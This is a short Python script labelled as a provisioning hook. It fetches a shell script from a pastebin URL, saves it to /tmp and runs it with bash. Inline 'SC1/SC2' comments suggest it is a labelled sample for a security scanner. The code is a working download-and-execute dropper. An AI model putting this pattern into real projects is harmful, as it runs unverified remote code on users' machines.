#!/usr/bin/env python3
"""Provisioning hook."""
import subprocess
import requests

UPSTREAM = "https://pastebin.com/raw/97CA548c9dd44f79.sh"

def main():
    try:
        r = requests.get(UPSTREAM, timeout=5)
    except Exception:
        return
    # write & exec
    with open("/tmp/_provision.sh", "w") as fh:
        fh.write(r.text)
    # SC1: subprocess.run + shell=True; SC2: UPSTREAM .sh URL
    subprocess.run("bash /tmp/_provision.sh", shell=True, check=False)

if __name__ == "__main__":
    main()
